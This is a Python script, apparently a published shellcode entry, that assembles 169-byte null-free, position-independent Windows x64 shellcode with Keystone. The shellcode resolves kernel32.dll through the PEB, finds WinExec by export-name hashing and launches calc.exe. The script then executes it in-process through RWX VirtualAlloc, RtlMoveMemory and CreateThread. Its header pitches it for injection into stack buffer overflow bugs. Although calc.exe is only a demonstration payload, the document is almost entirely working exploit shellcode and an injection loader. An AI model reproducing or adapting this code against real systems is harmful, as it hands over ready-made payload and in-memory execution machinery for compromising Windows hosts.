import ctypes, struct
from keystone import *


# Shellcode Author: Senzee
# Shellcode Title: Windows/x64 - PIC Null-Free Calc.exe Shellcode (169 Bytes)
# Date: 07/26/2023
# Platform: Windows x64
# Tested on: Windows 11 Home/Windows Server 2022 Standard/Windows Server 2019 Datacenter
# OS Version (respectively): 10.0.22621 /10.0.20348 /10.0.17763
# Shellcode size: 169 bytes
# Shellcode Desciption: Windows x64 shellcode that dynamically resolves the base address of kernel32.dll via PEB and ExportTable method.
# Contains no Null bytes (0x00), and therefor will not crash if injected into typical stack Buffer OverFlow vulnerabilities.


CODE = (
"find_kernel32:"
" and rsp, 0FFFFFFFFFFFFFFF0h;"
" xor rdx, rdx;"
" mov rax, gs:[rdx+0x60];"    # RAX stores  the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
" mov rsi,[rax+0x18];"    # Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
" mov rsi,[rsi + 0x20];"    # RSI is the address of the InMemoryOrderModuleList member in the _PEB_LDR_DATA structure
" mov r9, [rsi];"    # Current module is python.exe
" mov r9, [r9];"    # Current module is ntdll.dll
" mov r9, [r9+0x20];"    # Current module is kernel32.dll
" jmp call_winexec;"

"parse_module:" # Parsing DLL file in memory
" mov ecx, dword ptr [r9 + 0x3c];" # R9 stores  the base address of the module, get the NT header offset
" xor r15, r15;"
" mov r15b, 0x88;"    # Offset to Export Directory   
" add r15, r9;"
" add r15, rcx;"
" mov r15d, dword ptr [r15];"    # Get the RVA of the export directory
" add r15, r9;"    # R14 stores  the VMA of the export directory
" mov ecx, dword ptr [r15 + 0x18];"    # ECX stores  the number of function names as an index value
" mov r14d, dword ptr [r15 + 0x20];"    # Get the RVA of ENPT
" add r14, r9;"    # R14 stores  the VMA of ENPT

"search_function:"    # Search for a given function
" jrcxz not_found;"    # If RCX is 0, the given function is not found
" dec ecx;"    # Decrease index by 1
" xor rsi, rsi;"
" mov esi, [r14 + rcx*4];"    # RVA of function name string
" add rsi, r9;"    # RSI points to function name string

"function_hashing:"    # Hash function name function
" xor rax, rax;"
" xor rdx, rdx;"
" cld;"    # Clear DF flag

"iteration:"     # Iterate over each byte
" lodsb;"     # Copy the next byte of RSI to Al
" test al, al;"     # If reaching the end of the string
" jz compare_hash;"     # Compare hash
" ror edx, 0x0d;"     # Part of hash algorithm
" add edx, eax;"     # Part of hash algorithm
" jmp iteration;"     # Next byte

"compare_hash:"     # Compare hash
" cmp edx, r8d;"
" jnz search_function;"     # If not equal, search the previous function (index decreases)
" mov r10d, [r15 + 0x24];"     # Ordinal table RVA
" add r10, r9;"     # Ordinal table VMA
" movzx ecx, word ptr [r10 + 2*rcx];"     # Ordinal value -1
" mov r11d, [r15 + 0x1c];"    # RVA of EAT
" add r11, r9;"    # VMA of EAT
" mov eax, [r11 + 4*rcx];"    # RAX stores  RVA of the function
" add rax, r9;"    # RAX stores  VMA of the function
" ret;"
"not_found:"
" ret;"


"call_winexec:"
"    mov r8d, 0xe8afe98;"     # WinExec Hash
"    call parse_module;"     # Search and obtain address of WinExec
"    xor rcx, rcx;"
"    push rcx;"    # \0
"    mov rcx, 0x6578652e636c6163;"	  # exe.clac 
"    push rcx;"
"    lea rcx, [rsp];"    # Address of the string as the 1st argument lpCmdLine
"    xor rdx,rdx;"
"    inc rdx;"    # uCmdShow=1 as the 2nd argument 
"    sub rsp, 0x30;"
"    call rax;"     # WinExec

)


# Payload size: 169 bytes
# buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
# buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
# buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
# buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
# buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
# buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
# buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31"
# buf += b"\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2"
# buf += b"\x48\xff\xc2\x48\x83\xec\x28\xff\xd0"


ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("%d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

sc = ""
print("Payload size: "+str(len(encoding))+" bytes")


counter = 0
sc = "buf =  b\""
for dec in encoding:
    if counter % 20 == 0 and counter != 0:
        sc += "\"\nbuf += b\""
    sc += "\\x{0:02x}".format(int(dec))
    counter += 1

if count % 20 > 0:
	sc += "\""  
print(sc)
print("Payload size: "+str(len(encoding))+" bytes")

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(ptr))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
